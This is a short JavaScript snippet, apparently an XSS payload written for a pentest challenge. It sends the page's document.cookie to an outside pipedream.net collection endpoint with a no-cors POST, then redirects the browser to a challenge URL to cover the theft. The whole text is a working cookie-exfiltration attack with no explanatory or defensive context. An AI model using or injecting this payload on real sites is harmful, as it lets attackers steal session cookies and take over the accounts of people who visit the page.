// send cookies
fetch('https://eor294w8lwqac1y.m.pipedream.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
// redirect to stealth
window.location.replace("https://challenge.almond-pentest.fr/?p=&c=");
